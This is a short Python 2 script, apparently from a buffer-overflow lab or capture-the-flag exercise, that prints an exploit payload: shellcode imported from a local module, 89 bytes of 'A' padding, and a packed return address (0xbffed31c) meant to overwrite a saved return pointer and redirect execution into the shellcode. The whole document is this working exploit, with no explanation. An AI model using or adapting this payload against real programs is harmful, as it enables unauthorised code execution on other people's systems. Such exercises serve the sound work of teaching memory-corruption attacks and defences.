from shellcode import shellcode
from struct import pack 

print shellcode+"A"*89 + pack("<I",0xbffed31c)
